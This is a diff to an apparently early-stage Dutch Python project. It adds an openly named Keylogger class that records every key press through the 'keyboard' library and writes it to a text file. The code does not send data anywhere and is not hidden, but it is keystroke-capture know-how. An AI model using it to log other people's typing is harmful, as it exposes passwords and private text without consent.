@@ -11,6 +11,28 @@ import keyboard as kb
 # Hieronder de relevante code
 
 
+class Keylogger:
+    def __init__(self):
+        self.is_active = True
+        self.events_queue = []
+        self.relevant_keys = []
+
+    def activate_keylogger(self, text_file):
+        self.is_active = True
+
+    def deactivate_keylogger(self):
+        self.is_active = False
+
+    def start_logging_keys(self, text_file):
+        self.events_queue = kb.start_recording()  # Begin met opnemen aan het begin van het opstarten van programma.
+        while True:
+            press_events, release_events = self.events_queue
+            while not press_events.empty():
+                event = press_events.get()
+                if event.event_type == 'down':
+                    self.relevant_keys.append(event)
+                    text_file.write(str(event) + '\n')
+
 
 def main():
     """Tijdelijk de mogelijkheden van de kb library i.v.m. dat we nog niet weten hoe precies op te slaan.
